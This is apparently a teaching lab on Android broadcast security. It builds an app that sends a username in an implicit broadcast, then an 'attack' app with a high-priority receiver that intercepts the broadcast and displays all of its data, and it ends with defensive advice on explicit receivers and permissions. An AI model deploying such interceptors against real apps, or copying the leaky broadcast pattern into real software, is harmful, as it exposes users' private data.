# Broadcast
[Background](#background)  
[Activity Instructions](#activity_instructions)   
[Exploitation Instructions](#exploitation_instructions)  
[Defense](#defense)  
[Hints](#hints)  



## <a name="background"></a>Background
Broadcast messages are sent when events happen, like receiving messages or receiving calls. An example of a broadcast sent by the Android system might be when the system switches into or out of airplane mode. Any apps in the system could listen to these events and read this data. That could mean that we could develop an app to block phone calls from specific people by listening to the broadcasts, and ending the call when it occurs.

The interesting thing here is that Android allows developers to build apps that send and receive broadcast events. Many apps have services running in background getting data from the server, so we cannot call activities from background. Instead, we must send a broadcast from services to the broadcast class, then run the activity from broadcast class.

Here is the security problem we will continue to explore. When we send broadcast data, we must consider who can receive this data and how to protect it. This is especially true when we send sensitive data like username, password, user location and phone number. Remember that everyone could listen to our broadcasts and read the data contained within.


## <a name="activity_instructions"></a>Activity Instructions
To show how exactly broadcast messages could be misused, we will follow the steps below.
i.	Create an app to send a broadcast message containing the username. 
ii.	Read in the broadcast message to display it onscreen.
iii.	Build another app to intercept the broadcast message.
iv.	Show how to protect the content of the broadcast messages from attackers.

#### 1.	Project Creation
a.	Follow the screens below to create a new project. Name the project “AndroidBroadcast”. Take note of the package name here, under the first two lines.
<img style="margin:10px;" src="https://github.com/dan7800/VulnerableAndroidAppOracle/blob/master/Pictures/Broadcast/image1.png" alt="Image">

 This app will send the username every 50000ms in a system broadcast. This app will also have a Broadcast class to receive the message and display the data in a message.
<img style="margin:10px;" src="https://github.com/dan7800/VulnerableAndroidAppOracle/blob/master/Pictures/Broadcast/image2.png" alt="Image">
<img style="margin:10px;" src="https://github.com/dan7800/VulnerableAndroidAppOracle/blob/master/Pictures/Broadcast/image3.png" alt="Image">
<img style="margin:10px;" src="https://github.com/dan7800/VulnerableAndroidAppOracle/blob/master/Pictures/Broadcast/image4.png" alt="Image">

#### 2. Code
a.	Create two new classes called MyReceiver and ServiceNotification. Use File > New > Java Class, keeping the package name as is.  

b.	Open **MyReceiver**, found under “app/java/your_package_name”, keep only the package name in the file. Remove the rest of the code and paste the following code under the package name in your **MyReceiver** file.

The **MyReceiver** class should look like this:

```java
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.widget.Toast;

public class MyReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        
        // get the bundles in the message
        final Bundle bundle = intent.getExtras();
        
        // check the action equal to the action we fire in broadcast,
        if (intent.getAction().equalsIgnoreCase("com.example.Broadcast"))
            
            //read the data from the intent 
            Toast.makeText(context, bundle.getString("username"),Toast.LENGTH_LONG).show();
    }
}
```

The above onRecive method achieves the following:
<ul>
  <li>Handles the onReceive event</li>
  <li>Check to see that the received message came from the Broadcast class.</li>
  <li>Read the data from the intent and print the username.</li>
</ul> 

c.	Open **ServiceNotification**, found under “app/java/your_package_name”, keep only the package name in the file. Remove the rest of the code and paste the following code under the package name in your **ServiceNotification** file.

The **ServiceNotification** class should look like this:

```java
import android.app.IntentService;
import android.content.Intent;

public class ServiceNotification extends IntentService {

    public static boolean ServiceIsRun=false;

    public ServiceNotification() {
        super("MyWebRequestService");
    }
    protected void onHandleIntent(Intent workIntent) {

        // continue sending the messages
        while ( ServiceIsRun) {

            // creat new intent
            Intent intent = new Intent();

            //set the action that will receive our broadcast
            intent.setAction("com.example.Broadcast");

            // add data to the bundle
            intent.putExtra("username", "alxs1aa");

            // send the data to broadcast
            sendBroadcast(intent);

            //delay for 50000ms
            try{
                Thread.sleep(50000);
            }catch (Exception ex){}

        }
    }

}
```

The above code achieves the following:
<ul>
<li>The ServiceNotification class instantiation passes the “MyWebRequestService” string to the construction method of the superclass IntentService.</li>
<li>The onHandleIntent method sends a broadcast message with the username intended for “com.example.Broadcast”</li>
</ul>

d.	Open **MainActivity**, found under “app/java/your_package_name”, keep only the package name in the file. Remove the rest of the code and paste the following code under the package name in your **MainActivity** file.

The **MainActivity** class should look like this:

```java
import android.content.Intent;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        // check if the services is already runs in background
        if(ServiceNotification.ServiceIsRun==false ) {
            
            ServiceNotification.ServiceIsRun  = true;
            
            //register the services to run in background
            Intent intent = new Intent(this, ServiceNotification.class);
            
            // start the services
            startService(intent);

        }
    }
}
```

The above code registers the service named ServiceNotification to run in the background.

3.	Manifest File
The manifest file is found under “app/manifests/”, named AndroidManifest.xml.
```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
package="you_package_name">

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:supportsRtl="true"
        android:theme="@style/AppTheme">
        <activity android:name=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <!-- register the broadcast to listen to action names com.example.Broadcast-->
        <receiver android:name=".MyReceiver" android:priority="2147483647" >
        <intent-filter>
        <action android:name="com.example.Broadcast" >
        </action>
        </intent-filter>
        </receiver>
        <!-- register the service-->
        <service
        android:name=".ServiceNotification"
        android:exported="false" >
        </service>
    </application>

</manifest>
```
4.	Construct User Interface

Open activity_main.xml file under app > res > layout > activity_main.xml. Switch to text tab and remove all code and paste the following code into the xml file


```xml
<?xml version="1.0" encoding="utf-8"?>
<android.support.constraint.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".MainActivity">

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="sending broadcast"
        app:layout_constraintBottom_toBottomOf="parent"
        app:layout_constraintLeft_toLeftOf="parent"
        app:layout_constraintRight_toRightOf="parent"
        app:layout_constraintTop_toTopOf="parent" />

</android.support.constraint.ConstraintLayout>
```

## <a name="exploitation_instructions"></a>Exploitation Instructions

We will see how this could be misused here.

1.	Run the app. We will see that the username is broadcasted below.

<img style="margin:10px;" src="https://github.com/dan7800/VulnerableAndroidAppOracle/blob/master/Pictures/Broadcast/image5.png" alt="Image">

2.	We will build a malicious app to intercept the messages those are broadcasting. Any attacker could reverse engineer an app, read the manifest file, and build an app to intercept the broadcast actions the original app was receiving.

i.	Create a new app. Name it “AndroidBroadcastAttack”.
<img style="margin:10px;" src="https://github.com/dan7800/VulnerableAndroidAppOracle/blob/master/Pictures/Broadcast/image6.png" alt="Image">
<img style="margin:10px;" src="https://github.com/dan7800/VulnerableAndroidAppOracle/blob/master/Pictures/Broadcast/image50.png" alt="Image">
<img style="margin:10px;" src="https://github.com/dan7800/VulnerableAndroidAppOracle/blob/master/Pictures/Broadcast/image51.png" alt="Image">

ii. Create a new notification class called **NewMessageNotification**, using File > New > UI Component > Notification. use default options to create the class.

ii.	Create a new class called **MyReceiver**, using the File > New > Java Class menu option.  
iii. Open **MyReceiver**, found under “app/java/your_package_name”, keep only the package name in the file. Remove the rest of the code and paste the following code under the package name in your **MyReceiver** file.

```java
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;

public class  MyReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {

        String dataBundel = "";

        // get app the data sent on bundle
        Bundle bundle= intent.getExtras();

        //lopp through all keys in the bundle
        for (String key : bundle.keySet()) {

            // get object by key( we define object became it may be text or image or whatever
            Object value = bundle.get(key);

            //get all keys
            dataBundel += String.format("%s %s (%s)", key, value.toString(), value.getClass().getName());
        }

        //display notify message to the user
        NewMessageNotification notifyMe = new NewMessageNotification();

        notifyMe.notify(context, dataBundel, 123);

    }
}
```

vi.	Insert the following into the manifest file of the malicious app, found under “app/manifests/”. It is called “AndroidManifest.xml”.
```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
package="****YOUR_PACKAGE_NAME****">

    <uses-permission android:name="android.permission.VIBRATE" />
    
    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:supportsRtl="true"
        android:theme="@style/AppTheme">
        <activity android:name=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
    
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <!-- Register broadcast to listen to broadcast action names com.example.Broadcast-->
        <receiver
            android:name=".MyReceiver"
            android:priority="2147483647">
            <intent-filter>
                <action android:name="com.example.Broadcast"></action>
            </intent-filter>
        </receiver>
    </application>

</manifest>
```

Now run the app. You will find the previous broadcast message on the screen.
    
## <a name="defense"></a>Defense

In general, do not assume that the contents of broadcast messages will be private. Consider the permissions it has, the level of specification you used when declaring who should receive the broadcast messages, and whether a broadcast fits your needs.

To deliver a broadcast message to a specific recipient, use an explicit receiver declaring the recipient by name. In addition to this, you could also specify a non-null permission when declaring the method call. Then, only the apps with the correct permissions will be able to register for messages. You might also want to consider invoking the recipient directly, instead of using a broadcast.

## <a name="hints"></a>Hints

1- You can find the package name several different ways for example
	<ul>
    	<li>app > AndroidManifest.xml locate package in the manifest tag</li>
        <li>Gradle Scripts > build.gradle locate applicationId (~ line 7)</li>
    </ul>
    
2- The android sdk path can be found in Gradle Scripts > local.properties. Then locate sdk.dir

3- The code can be reformatted through Code->reformat code.
